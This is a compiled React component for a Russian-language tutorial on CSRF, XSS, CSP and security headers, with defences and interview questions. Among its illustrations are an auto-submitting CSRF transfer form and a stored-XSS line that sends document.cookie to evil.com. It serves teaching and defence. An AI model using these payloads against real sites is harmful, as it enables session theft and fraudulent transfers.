import { jsx as _jsx, jsxs as _jsxs, Fragment as _Fragment } from "react/jsx-runtime";
import { useState } from 'react';
const cspDirectives = [
    { directive: "default-src 'self'", desc: 'Всё по умолчанию — только с текущего домена' },
    { directive: "script-src 'self' 'nonce-abc123'", desc: 'Скрипты: свои + с конкретным nonce' },
    { directive: "style-src 'self' 'unsafe-inline'", desc: 'Стили: свои + inline (небезопасно!)' },
    { directive: "img-src * data:", desc: 'Картинки: откуда угодно + data: URI' },
    { directive: "connect-src 'self' https://api.example.com", desc: 'fetch/XHR/WebSocket: свои + конкретный API' },
    { directive: "frame-src 'none'", desc: 'Запрет вставки iframe' },
    { directive: "object-src 'none'", desc: 'Запрет Flash/Java plugins (рекомендуется всегда)' },
    { directive: "base-uri 'self'", desc: 'Запрет подмены <base> — защита от open redirect' },
    { directive: "form-action 'self'", desc: 'Формы могут отправляться только на свой домен' },
    { directive: 'upgrade-insecure-requests', desc: 'Автоматически заменять http:// → https://' },
    { directive: 'report-uri /csp-report', desc: 'URL для отправки отчётов о нарушениях CSP' },
];
const securityHeaders = [
    { header: 'Content-Security-Policy', desc: 'Контроль источников ресурсов (скрипты, стили, картинки)', importance: 'critical' },
    { header: 'Strict-Transport-Security', desc: 'HSTS — заставляет браузер всегда использовать HTTPS', importance: 'critical' },
    { header: 'X-Content-Type-Options', desc: 'nosniff — запрет MIME-sniffing (не угадывать тип)', importance: 'high' },
    { header: 'X-Frame-Options', desc: 'DENY/SAMEORIGIN — защита от clickjacking через iframe', importance: 'high' },
    { header: 'Referrer-Policy', desc: 'Что передавать в Referer при навигации', importance: 'medium' },
    { header: 'Permissions-Policy', desc: 'Контроль доступа к API (camera, microphone, geolocation)', importance: 'medium' },
    { header: 'X-XSS-Protection', desc: '⚠️ Устаревший! Встроенный XSS-фильтр (только IE/старый Chrome)', importance: 'deprecated' },
];
export default function WebSecurityDemo() {
    const [activeTab, setActiveTab] = useState('csrf');
    return (_jsxs("div", { className: "page-container", children: [_jsx("h1", { children: "\uD83D\uDD12 Web Security: CSRF, XSS, CSP" }), _jsx("p", { className: "page-description", children: "\u0422\u0440\u0438 \u0433\u043B\u0430\u0432\u043D\u044B\u0445 \u0432\u0435\u043A\u0442\u043E\u0440\u0430 \u0430\u0442\u0430\u043A \u0432 \u0432\u0435\u0431-\u043F\u0440\u0438\u043B\u043E\u0436\u0435\u043D\u0438\u044F\u0445 \u0438 \u043C\u0435\u0445\u0430\u043D\u0438\u0437\u043C\u044B \u0437\u0430\u0449\u0438\u0442\u044B. \u041E\u0431\u044F\u0437\u0430\u0442\u0435\u043B\u044C\u043D\u044B\u0435 \u0437\u043D\u0430\u043D\u0438\u044F \u0434\u043B\u044F middle+ \u0440\u0430\u0437\u0440\u0430\u0431\u043E\u0442\u0447\u0438\u043A\u0430." }), _jsx("div", { className: "tabs", style: { marginBottom: '24px' }, children: [
                    { key: 'csrf', label: '🎭 CSRF' },
                    { key: 'xss', label: '💉 XSS' },
                    { key: 'csp', label: '🛡️ CSP' },
                    { key: 'headers', label: '📋 Security Headers' },
                    { key: 'interview', label: '🎯 Вопросы' },
                ].map(tab => (_jsx("button", { className: `tab ${activeTab === tab.key ? 'active' : ''}`, onClick: () => setActiveTab(tab.key), children: tab.label }, tab.key))) }), activeTab === 'csrf' && (_jsxs(_Fragment, { children: [_jsxs("div", { className: "card", children: [_jsxs("div", { className: "card-header", children: [_jsx("span", { className: "card-title", children: "\uD83C\uDFAD CSRF \u2014 Cross-Site Request Forgery" }), _jsx("span", { className: "card-badge", children: "\u0412\u0430\u0436\u043D\u043E!" })] }), _jsxs("div", { className: "info-box", children: [_jsx("strong", { children: "\u0421\u0443\u0442\u044C \u0430\u0442\u0430\u043A\u0438:" }), " \u0417\u043B\u043E\u0443\u043C\u044B\u0448\u043B\u0435\u043D\u043D\u0438\u043A \u0437\u0430\u0441\u0442\u0430\u0432\u043B\u044F\u0435\u0442 \u0431\u0440\u0430\u0443\u0437\u0435\u0440 \u0430\u0432\u0442\u043E\u0440\u0438\u0437\u043E\u0432\u0430\u043D\u043D\u043E\u0433\u043E \u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u0435\u043B\u044F \u0432\u044B\u043F\u043E\u043B\u043D\u0438\u0442\u044C \u043D\u0435\u0436\u0435\u043B\u0430\u0442\u0435\u043B\u044C\u043D\u044B\u0439 \u0437\u0430\u043F\u0440\u043E\u0441 \u043A \u0434\u043E\u0432\u0435\u0440\u0435\u043D\u043D\u043E\u043C\u0443 \u0441\u0430\u0439\u0442\u0443. \u0411\u0440\u0430\u0443\u0437\u0435\u0440 \u0430\u0432\u0442\u043E\u043C\u0430\u0442\u0438\u0447\u0435\u0441\u043A\u0438 \u043F\u0440\u0438\u043A\u0440\u0435\u043F\u043B\u044F\u0435\u0442 cookies!"] }), _jsx("h4", { style: { margin: '20px 0 12px' }, children: "\uD83D\uDCD0 \u0421\u0445\u0435\u043C\u0430 \u0430\u0442\u0430\u043A\u0438" }), _jsxs("div", { style: {
                                    padding: '20px',
                                    background: 'var(--bg-code)',
                                    borderRadius: '8px',
                                    fontFamily: 'monospace',
                                    fontSize: '0.85rem',
                                    lineHeight: 2
                                }, children: [_jsxs("div", { children: ["1\uFE0F\u20E3 \u041F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u0435\u043B\u044C \u0437\u0430\u043B\u043E\u0433\u0438\u043D\u0435\u043D \u043D\u0430 ", _jsx("span", { style: { color: 'var(--accent-green)' }, children: "bank.com" }), " (\u0435\u0441\u0442\u044C session cookie)"] }), _jsxs("div", { children: ["2\uFE0F\u20E3 \u041F\u0435\u0440\u0435\u0445\u043E\u0434\u0438\u0442 \u043D\u0430 ", _jsx("span", { style: { color: 'var(--accent-red)' }, children: "evil.com" })] }), _jsx("div", { children: "3\uFE0F\u20E3 \u041D\u0430 evil.com \u0441\u043A\u0440\u044B\u0442\u0430\u044F \u0444\u043E\u0440\u043C\u0430:" }), _jsx("pre", { style: {
                                            padding: '12px',
                                            background: 'rgba(239, 68, 68, 0.08)',
                                            borderRadius: '4px',
                                            margin: '4px 0 4px 24px',
                                            border: '1px solid rgba(239, 68, 68, 0.15)'
                                        }, children: `<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>` }), _jsxs("div", { children: ["4\uFE0F\u20E3 \u0411\u0440\u0430\u0443\u0437\u0435\u0440 \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u044F\u0435\u0442 POST \u043D\u0430 bank.com ", _jsx("span", { style: { color: 'var(--accent-red)' }, children: "\u0441 cookies \u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u0435\u043B\u044F!" })] }), _jsx("div", { children: "5\uFE0F\u20E3 \u0421\u0435\u0440\u0432\u0435\u0440 \u0432\u0438\u0434\u0438\u0442 \u0432\u0430\u043B\u0438\u0434\u043D\u0443\u044E \u0441\u0435\u0441\u0441\u0438\u044E \u2192 \u0432\u044B\u043F\u043E\u043B\u043D\u044F\u0435\u0442 \u043F\u0435\u0440\u0435\u0432\u043E\u0434 \uD83D\uDCB8" })] })] }), _jsxs("div", { className: "card", children: [_jsx("div", { className: "card-header", children: _jsx("span", { className: "card-title", children: "\uD83D\uDEE1\uFE0F \u041C\u0435\u0442\u043E\u0434\u044B \u0437\u0430\u0449\u0438\u0442\u044B \u043E\u0442 CSRF" }) }), _jsx("div", { style: { display: 'flex', flexDirection: 'column', gap: '16px' }, children: [
                                    {
                                        name: 'SameSite Cookies',
                                        level: 'Основной',
                                        color: 'var(--accent-green)',
                                        desc: 'SameSite=Lax/Strict не отправляет куки при cross-site запросах. Дефолт в Chrome.',
                                        code: `Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly`
                                    },
                                    {
                                        name: 'CSRF Token',
                                        level: 'Классический',
                                        color: 'var(--accent-cyan)',
                                        desc: 'Уникальный токен в форме + сессии. Сервер проверяет совпадение. Evil.com не знает токен.',
                                        code: `<form>\n  <input type="hidden" name="_csrf" value="random-token-from-server">\n</form>`
                                    },
                                    {
                                        name: 'Double Submit Cookie',
                                        level: 'Stateless',
                                        color: 'var(--accent-orange)',
                                        desc: 'Токен и в cookie, и в header/body. Сервер проверяет совпадение. Evil.com не может прочитать куку другого домена.',
                                        code: `// Cookie: csrf=token123\nfetch('/api', { headers: { 'X-CSRF-Token': 'token123' } })`
                                    },
                                    {
                                        name: 'Проверка Origin/Referer',
                                        level: 'Дополнительный',
                                        color: 'var(--accent-purple)',
                                        desc: 'Сервер проверяет Origin или Referer header. Отклоняет если домен не совпадает.',
                                        code: `if (req.headers.origin !== 'https://bank.com') return 403`
                                    },
                                ].map(method => (_jsxs("div", { style: {
                                        padding: '16px',
                                        background: 'var(--bg-code)',
                                        borderRadius: '8px',
                                        borderLeft: `3px solid ${method.color}`
                                    }, children: [_jsxs("div", { style: { display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }, children: [_jsx("strong", { style: { color: method.color }, children: method.name }), _jsx("span", { style: {
                                                        fontSize: '0.7rem',
                                                        padding: '2px 6px',
                                                        background: `${method.color}22`,
                                                        color: method.color,
                                                        borderRadius: '4px'
                                                    }, children: method.level })] }), _jsx("p", { style: { color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '8px' }, children: method.desc }), _jsx("pre", { style: { fontSize: '0.8rem', padding: '8px', background: 'rgba(0,0,0,0.2)', borderRadius: '4px' }, children: method.code })] }, method.name))) })] })] })), activeTab === 'xss' && (_jsxs(_Fragment, { children: [_jsxs("div", { className: "card", children: [_jsxs("div", { className: "card-header", children: [_jsx("span", { className: "card-title", children: "\uD83D\uDC89 XSS \u2014 Cross-Site Scripting" }), _jsx("span", { className: "card-badge", children: "\u0421\u0430\u043C\u0430\u044F \u0447\u0430\u0441\u0442\u0430\u044F \u0430\u0442\u0430\u043A\u0430!" })] }), _jsxs("div", { className: "info-box", style: { background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.2)' }, children: [_jsx("strong", { children: "\u0421\u0443\u0442\u044C \u0430\u0442\u0430\u043A\u0438:" }), " \u0412\u043D\u0435\u0434\u0440\u0435\u043D\u0438\u0435 \u0432\u0440\u0435\u0434\u043E\u043D\u043E\u0441\u043D\u043E\u0433\u043E JavaScript \u0432 \u0441\u0442\u0440\u0430\u043D\u0438\u0446\u0443. \u0421\u043A\u0440\u0438\u043F\u0442 \u0432\u044B\u043F\u043E\u043B\u043D\u044F\u0435\u0442\u0441\u044F \u0432 \u043A\u043E\u043D\u0442\u0435\u043A\u0441\u0442\u0435 \u0436\u0435\u0440\u0442\u0432\u044B \u2192 \u0434\u043E\u0441\u0442\u0443\u043F \u043A cookies, localStorage, DOM."] }), _jsx("h4", { style: { margin: '20px 0 12px' }, children: "3 \u0442\u0438\u043F\u0430 XSS" }), _jsx("div", { style: { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '16px' }, children: [
                                    {
                                        type: 'Stored (Хранимая)',
                                        color: 'var(--accent-red)',
                                        desc: 'Вредоносный скрипт сохраняется в БД (комментарий, профиль). Все пользователи видят его.',
                                        example: `// Комментарий в БД:\n<script>fetch('https://evil.com?c='+document.cookie)</script>`,
                                        danger: 'Самая опасная!'
                                    },
                                    {
                                        type: 'Reflected (Отражённая)',
                                        color: 'var(--accent-orange)',
                                        desc: 'Скрипт в URL или форме, сервер отражает его в ответе без экранирования.',
                                        example: `// URL:\nhttps://site.com/search?q=<script>alert(1)</script>\n\n// Сервер возвращает:\nРезультаты для: <script>alert(1)</script>`,
                                        danger: 'Частая!'
                                    },
                                    {
                                        type: 'DOM-based',
                                        color: 'var(--accent-purple)',
                                        desc: 'Скрипт не проходит через сервер. Уязвимость в клиентском JS (innerHTML, eval).',
                                        example: `// Уязвимый код:\ndiv.innerHTML = location.hash.slice(1)\n\n// URL:\nhttps://site.com#<img onerror=alert(1) src=x>`,
                                        danger: 'Сложно найти'
                                    },
                                ].map(xss => (_jsxs("div", { style: {
                                        padding: '16px',
                                        background: 'var(--bg-code)',
                                        borderRadius: '8px',
                                        borderTop: `3px solid ${xss.color}`
                                    }, children: [_jsxs("div", { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }, children: [_jsx("h4", { style: { color: xss.color }, children: xss.type }), _jsx("span", { style: { fontSize: '0.7rem', color: xss.color }, children: xss.danger })] }), _jsx("p", { style: { fontSize: '0.85rem', color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '12px' }, children: xss.desc }), _jsx("pre", { style: { fontSize: '0.78rem', padding: '10px', background: 'rgba(0,0,0,0.2)', borderRadius: '4px', whiteSpace: 'pre-wrap' }, children: xss.example })] }, xss.type))) })] }), _jsxs("div", { className: "card", children: [_jsx("div", { className: "card-header", children: _jsx("span", { className: "card-title", children: "\uD83D\uDEE1\uFE0F \u0417\u0430\u0449\u0438\u0442\u0430 \u043E\u0442 XSS" }) }), _jsx("div", { style: { display: 'flex', flexDirection: 'column', gap: '12px' }, children: [
                                    {
                                        method: 'Экранирование вывода',
                                        icon: '1️⃣',
                                        desc: 'Заменять < > & " \' на HTML-сущности. React/Vue делают это автоматически!',
                                        safe: `// React автоматически экранирует:\n<div>{userInput}</div> // Безопасно!\n\n// Vue автоматически:\n<div>{{ userInput }}</div> // Безопасно!`,
                                        danger: `// ОПАСНО — отключает экранирование:\n<div dangerouslySetInnerHTML={{__html: userInput}} />\n<div v-html="userInput"></div>`
                                    },
                                    {
                                        method: 'Content Security Policy',
                                        icon: '2️⃣',
                                        desc: 'CSP запрещает inline-скрипты и скрипты с неизвестных доменов.',
                                        safe: `Content-Security-Policy: script-src 'self' 'nonce-abc123'`,
                                        danger: `// CSP блокирует:\n<script>alert(1)</script> // inline — заблокирован!`
                                    },
                                    {
                                        method: 'HttpOnly cookies',
                                        icon: '3️⃣',
                                        desc: 'Если XSS случился — злоумышленник не сможет прочитать HttpOnly куки.',
                                        safe: `Set-Cookie: session=abc; HttpOnly; Secure`,
                                        danger: `// document.cookie не увидит HttpOnly куки`
                                    },
                                    {
                                        method: 'Санитизация ввода',
                                        icon: '4️⃣',
                                        desc: 'Очищать HTML от опасных тегов. Библиотека: DOMPurify.',
                                        safe: `import DOMPurify from 'dompurify'\nconst clean = DOMPurify.sanitize(userInput)`,
                                        danger: `// Никогда: eval(userInput), innerHTML = userInput`
                                    },
                                ].map(item => (_jsxs("div", { style: { padding: '16px', background: 'var(--bg-code)', borderRadius: '8px' }, children: [_jsxs("div", { style: { display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '8px' }, children: [_jsx("span", { children: item.icon }), _jsx("strong", { children: item.method })] }), _jsx("p", { style: { color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '8px' }, children: item.desc }), _jsxs("div", { style: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }, children: [_jsxs("div", { children: [_jsx("div", { style: { fontSize: '0.75rem', color: 'var(--accent-green)', marginBottom: '4px' }, children: "\u2705 \u0411\u0435\u0437\u043E\u043F\u0430\u0441\u043D\u043E" }), _jsx("pre", { style: { fontSize: '0.78rem', padding: '8px', background: 'rgba(34, 197, 94, 0.05)', borderRadius: '4px', border: '1px solid rgba(34, 197, 94, 0.1)', whiteSpace: 'pre-wrap' }, children: item.safe })] }), _jsxs("div", { children: [_jsx("div", { style: { fontSize: '0.75rem', color: 'var(--accent-red)', marginBottom: '4px' }, children: "\u274C \u041E\u043F\u0430\u0441\u043D\u043E" }), _jsx("pre", { style: { fontSize: '0.78rem', padding: '8px', background: 'rgba(239, 68, 68, 0.05)', borderRadius: '4px', border: '1px solid rgba(239, 68, 68, 0.1)', whiteSpace: 'pre-wrap' }, children: item.danger })] })] })] }, item.method))) })] })] })), activeTab === 'csp' && (_jsxs(_Fragment, { children: [_jsxs("div", { className: "card", children: [_jsxs("div", { className: "card-header", children: [_jsx("span", { className: "card-title", children: "\uD83D\uDEE1\uFE0F CSP \u2014 Content Security Policy" }), _jsx("span", { className: "card-badge", children: "\u0413\u043B\u0443\u0431\u043E\u043A\u0430\u044F \u0442\u0435\u043C\u0430!" })] }), _jsxs("div", { className: "info-box", children: [_jsx("strong", { children: "\u0427\u0442\u043E \u044D\u0442\u043E:" }), " HTTP-\u0437\u0430\u0433\u043E\u043B\u043E\u0432\u043E\u043A, \u043A\u043E\u0442\u043E\u0440\u044B\u0439 \u0443\u043A\u0430\u0437\u044B\u0432\u0430\u0435\u0442 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0443, \u043E\u0442\u043A\u0443\u0434\u0430 \u043C\u043E\u0436\u043D\u043E \u0437\u0430\u0433\u0440\u0443\u0436\u0430\u0442\u044C \u0440\u0435\u0441\u0443\u0440\u0441\u044B. \u0415\u0441\u043B\u0438 \u0440\u0435\u0441\u0443\u0440\u0441 \u043D\u0435 \u043F\u043E\u0434\u0445\u043E\u0434\u0438\u0442 \u043F\u043E\u0434 \u043F\u0440\u0430\u0432\u0438\u043B\u0430 \u2014 \u0431\u0440\u0430\u0443\u0437\u0435\u0440 \u0435\u0433\u043E \u0431\u043B\u043E\u043A\u0438\u0440\u0443\u0435\u0442. \u0413\u043B\u0430\u0432\u043D\u0430\u044F \u0437\u0430\u0449\u0438\u0442\u0430 \u043E\u0442 XSS!"] }), _jsx("h4", { style: { margin: '20px 0 12px' }, children: "\uD83D\uDCCB \u041E\u0441\u043D\u043E\u0432\u043D\u044B\u0435 \u0434\u0438\u0440\u0435\u043A\u0442\u0438\u0432\u044B CSP" }), _jsx("div", { style: { display: 'flex', flexDirection: 'column', gap: '6px' }, children: cspDirectives.map((item, i) => (_jsxs("div", { style: {
                                        display: 'grid',
                                        gridTemplateColumns: '1fr 1fr',
                                        gap: '16px',
                                        padding: '10px 14px',
                                        background: 'var(--bg-code)',
                                        borderRadius: '6px',
                                        alignItems: 'center'
                                    }, children: [_jsx("code", { style: { fontSize: '0.82rem', color: 'var(--accent-cyan)' }, children: item.directive }), _jsx("span", { style: { fontSize: '0.82rem', color: 'var(--text-secondary)' }, children: item.desc })] }, i))) })] }), _jsxs("div", { className: "card", children: [_jsx("div", { className: "card-header", children: _jsx("span", { className: "card-title", children: "\uD83D\uDD11 Nonce vs Hash" }) }), _jsxs("p", { style: { color: 'var(--text-secondary)', marginBottom: '16px' }, children: ["\u041A\u0430\u043A \u0440\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044C \u043A\u043E\u043D\u043A\u0440\u0435\u0442\u043D\u044B\u0435 inline-\u0441\u043A\u0440\u0438\u043F\u0442\u044B \u0431\u0435\u0437 ", _jsx("code", { children: "unsafe-inline" }), ":"] }), _jsxs("div", { style: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }, children: [_jsxs("div", { style: { padding: '16px', background: 'var(--bg-code)', borderRadius: '8px', borderTop: '3px solid var(--accent-cyan)' }, children: [_jsx("h4", { style: { color: 'var(--accent-cyan)', marginBottom: '10px' }, children: "Nonce (\u043E\u0434\u043D\u043E\u0440\u0430\u0437\u043E\u0432\u044B\u0439)" }), _jsx("pre", { style: { fontSize: '0.82rem', lineHeight: 1.6 }, children: `// Заголовок (сервер генерирует nonce):
Content-Security-Policy:
  script-src 'nonce-abc123'

// HTML:
<script nonce="abc123">
  alert('Разрешён!')
</script>

// Без nonce — заблокирован:
<script>alert('Nope!')</script>` }), _jsxs("div", { className: "info-box", style: { marginTop: '12px' }, children: ["Nonce \u0434\u043E\u043B\u0436\u0435\u043D \u0431\u044B\u0442\u044C \u0441\u043B\u0443\u0447\u0430\u0439\u043D\u044B\u043C \u0438 ", _jsx("strong", { children: "\u043D\u043E\u0432\u044B\u043C \u043F\u0440\u0438 \u043A\u0430\u0436\u0434\u043E\u043C \u0437\u0430\u043F\u0440\u043E\u0441\u0435!" })] })] }), _jsxs("div", { style: { padding: '16px', background: 'var(--bg-code)', borderRadius: '8px', borderTop: '3px solid var(--accent-orange)' }, children: [_jsx("h4", { style: { color: 'var(--accent-orange)', marginBottom: '10px' }, children: "Hash" }), _jsx("pre", { style: { fontSize: '0.82rem', lineHeight: 1.6 }, children: `// Заголовок (хеш содержимого скрипта):
Content-Security-Policy:
  script-src 'sha256-xyz...'

// HTML (содержимое должно точно
// совпасть с хешем):
<script>alert('Разрешён!')</script>

// Плюсы: не нужен серверный рендеринг
// Минусы: хрупкость — любой пробел
// меняет хеш` })] })] }), _jsxs("div", { className: "info-box warning", style: { marginTop: '16px' }, children: [_jsx("strong", { children: "\u26A0\uFE0F report-only \u0440\u0435\u0436\u0438\u043C:" }), " \u0417\u0430\u0433\u043E\u043B\u043E\u0432\u043E\u043A ", _jsx("code", { children: "Content-Security-Policy-Report-Only" }), " \u043D\u0435 \u0431\u043B\u043E\u043A\u0438\u0440\u0443\u0435\u0442, \u0430 \u0442\u043E\u043B\u044C\u043A\u043E \u043B\u043E\u0433\u0438\u0440\u0443\u0435\u0442 \u043D\u0430\u0440\u0443\u0448\u0435\u043D\u0438\u044F. \u0418\u0434\u0435\u0430\u043B\u044C\u043D\u043E \u0434\u043B\u044F \u0432\u043D\u0435\u0434\u0440\u0435\u043D\u0438\u044F CSP \u043D\u0430 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044E\u0449\u0438\u0445 \u043F\u0440\u043E\u0435\u043A\u0442\u0430\u0445!"] })] })] })), activeTab === 'headers' && (_jsxs("div", { className: "card", children: [_jsx("div", { className: "card-header", children: _jsx("span", { className: "card-title", children: "\uD83D\uDCCB Security Headers \u2014 \u043F\u043E\u043B\u043D\u044B\u0439 \u0441\u043F\u0438\u0441\u043E\u043A" }) }), _jsx("div", { style: { display: 'flex', flexDirection: 'column', gap: '10px' }, children: securityHeaders.map(h => (_jsxs("div", { style: {
                                display: 'grid',
                                gridTemplateColumns: '280px 1fr auto',
                                gap: '16px',
                                padding: '14px 16px',
                                background: 'var(--bg-code)',
                                borderRadius: '8px',
                                alignItems: 'center',
                                opacity: h.importance === 'deprecated' ? 0.6 : 1
                            }, children: [_jsx("code", { style: {
                                        fontWeight: 600,
                                        color: h.importance === 'critical' ? 'var(--accent-red)'
                                            : h.importance === 'high' ? 'var(--accent-orange)'
                                                : h.importance === 'deprecated' ? 'var(--text-muted)'
                                                    : 'var(--accent-cyan)',
                                        fontSize: '0.85rem'
                                    }, children: h.header }), _jsx("span", { style: { color: 'var(--text-secondary)', fontSize: '0.85rem' }, children: h.desc }), _jsx("span", { style: {
                                        fontSize: '0.7rem',
                                        padding: '2px 8px',
                                        borderRadius: '4px',
                                        background: h.importance === 'critical' ? 'rgba(239, 68, 68, 0.1)'
                                            : h.importance === 'high' ? 'rgba(249, 115, 22, 0.1)'
                                                : h.importance === 'deprecated' ? 'rgba(100, 100, 100, 0.1)'
                                                    : 'rgba(99, 102, 241, 0.1)',
                                        color: h.importance === 'critical' ? 'var(--accent-red)'
                                            : h.importance === 'high' ? 'var(--accent-orange)'
                                                : h.importance === 'deprecated' ? 'var(--text-muted)'
                                                    : 'var(--accent-cyan)',
                                    }, children: h.importance === 'critical' ? '🔴 Обязательно'
                                        : h.importance === 'high' ? '🟠 Важно'
                                            : h.importance === 'deprecated' ? '⚪ Устарел'
                                                : '🔵 Рекомендуется' })] }, h.header))) }), _jsx("h4", { style: { margin: '24px 0 12px' }, children: "\uD83D\uDCDD \u041F\u0440\u0438\u043C\u0435\u0440 \u0438\u0434\u0435\u0430\u043B\u044C\u043D\u044B\u0445 \u0437\u0430\u0433\u043E\u043B\u043E\u0432\u043A\u043E\u0432" }), _jsx("pre", { style: {
                            padding: '16px',
                            background: 'var(--bg-code)',
                            borderRadius: '8px',
                            fontSize: '0.82rem',
                            lineHeight: 1.8,
                            border: '1px solid rgba(34, 197, 94, 0.15)'
                        }, children: `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()` })] })), activeTab === 'interview' && (_jsxs("div", { className: "card", children: [_jsx("div", { className: "card-header", children: _jsx("span", { className: "card-title", children: "\uD83C\uDFAF \u0412\u043E\u043F\u0440\u043E\u0441\u044B \u0434\u043B\u044F \u0441\u043E\u0431\u0435\u0441\u0435\u0434\u043E\u0432\u0430\u043D\u0438\u044F" }) }), _jsx("div", { style: { display: 'flex', flexDirection: 'column', gap: '12px' }, children: [
                            {
                                q: 'Чем CSRF отличается от XSS?',
                                a: 'CSRF — злоумышленник заставляет браузер жертвы выполнить запрос к доверенному сайту (эксплуатирует доверие СЕРВЕРА к браузеру). XSS — внедряет скрипт в сайт (эксплуатирует доверие ПОЛЬЗОВАТЕЛЯ к сайту). CSRF не может прочитать ответ, только отправить запрос.'
                            },
                            {
                                q: 'Защищает ли SameSite=Lax от CSRF полностью?',
                                a: 'Почти. Lax блокирует cross-site POST, fetch, iframe. Но пропускает GET при top-level навигации (клик по ссылке). Если у вас GET-эндпоинт с side effects (плохая практика!) — Lax не поможет. Strict защищает полностью, но ломает навигацию.'
                            },
                            {
                                q: 'Что такое CSP и от чего защищает?',
                                a: 'Content Security Policy — HTTP-заголовок, указывающий браузеру откуда разрешено загружать ресурсы (скрипты, стили, картинки). Главная защита от XSS: даже если злоумышленник внедрит inline-скрипт, CSP его заблокирует.'
                            },
                            {
                                q: 'Что значит unsafe-inline в CSP?',
                                a: 'Разрешает inline-скрипты и inline-стили. Сильно ослабляет CSP, так как XSS обычно и вставляет inline-код. Лучше использовать nonce или hash для конкретных скриптов.'
                            },
                            {
                                q: 'Как React/Vue защищают от XSS?',
                                a: 'Они автоматически экранируют текстовый контент: { } в React и {{ }} в Vue превращают HTML в безопасные текстовые строки. Но dangerouslySetInnerHTML (React) и v-html (Vue) отключают экранирование — использовать только с санитизированными данными!'
                            },
                            {
                                q: 'Что такое HSTS и зачем preload?',
                                a: 'HSTS (Strict-Transport-Security) заставляет браузер использовать HTTPS. max-age говорит сколько секунд помнить. preload — вносит домен в предзагруженный список браузера, так что даже первый запрос будет HTTPS. Без preload первый запрос может быть HTTP.'
                            },
                            {
                                q: 'Как работает nonce в CSP?',
                                a: 'Сервер генерирует случайный nonce при каждом ответе, добавляет его в CSP заголовок и в атрибут nonce= тегов script. Браузер разрешает только скрипты с совпадающим nonce. Злоумышленник не может угадать nonce, поэтому его inline-скрипт заблокируется.'
                            },
                            {
                                q: 'Зачем X-Content-Type-Options: nosniff?',
                                a: 'Без него браузер может "угадать" тип файла (MIME sniffing). Например, файл .txt с JS-кодом может быть выполнен как скрипт. nosniff запрещает это — файл обрабатывается строго как указано в Content-Type.'
                            },
                        ].map((item, i) => (_jsxs("details", { className: "interview-question", children: [_jsx("summary", { style: {
                                        cursor: 'pointer',
                                        padding: '14px 16px',
                                        background: 'var(--bg-code)',
                                        borderRadius: '8px',
                                        fontWeight: 600,
                                        fontSize: '0.9rem'
                                    }, children: item.q }), _jsx("div", { style: {
                                        padding: '14px 16px',
                                        color: 'var(--text-secondary)',
                                        lineHeight: 1.6,
                                        borderLeft: '3px solid var(--accent-cyan)',
                                        marginLeft: '16px',
                                        marginTop: '8px'
                                    }, children: item.a })] }, i))) })] }))] }));
}
